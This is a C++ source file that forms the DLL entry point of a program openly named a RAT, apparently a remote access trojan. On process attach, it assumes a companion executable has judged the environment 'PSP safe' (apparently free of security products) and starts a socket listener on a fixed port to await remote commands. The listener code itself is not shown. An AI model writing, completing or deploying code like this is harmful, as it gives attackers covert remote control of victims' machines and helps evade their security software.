// Patrick Sacchet
// Verison 1.0.
// RAT-Dll-Main.cpp : Defines the entry point for the DLL application; main handler for user specific calls

#include "RAT-Dll-Main.h"
#include "RAT-Dll-Connect.h"


INT APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    INT status = SUCCESS;
    CHAR msgBuf[DEFAULT_BUF_LEN];

    switch (ul_reason_for_call)
    {
        // Executable has surveyed environment and deemed it safe to operate; make calls specific to functionality here
        case DLL_PROCESS_ATTACH:
        {
            sprintf_s(msgBuf, "RAT-Dll-Main::DllMain - Detected process attach; assumping enironment is PSP safe and starting socket listen on port %d", PORT_NUM);
            OutputDebugStringA(msgBuf);
            // Pass control to our listening function and wait for user input 
            status = startListen();
            if (status != SUCCESS)
            {
                sprintf_s(msgBuf, "RAT-Dll-Main::DllMain - startListen call failed! returned %i", status);
                OutputDebugStringA(msgBuf);
                return status;
            }
            OutputDebugStringA("RAT-Dll-Main::DllMain - startListen returned success! \n");
            break;
        }
        case DLL_THREAD_ATTACH:
        {
            break;
        }
        case DLL_THREAD_DETACH:
        {
            break;
        }
        // General cleanup before detaching and de-loading out of memory
        case DLL_PROCESS_DETACH:
        {
            OutputDebugStringA("RAT-Dll-Main::DllMain - PROCESS_DETACH detected; cleaning up... \n");
            break;
        }
    }

    return SUCCESS;
}

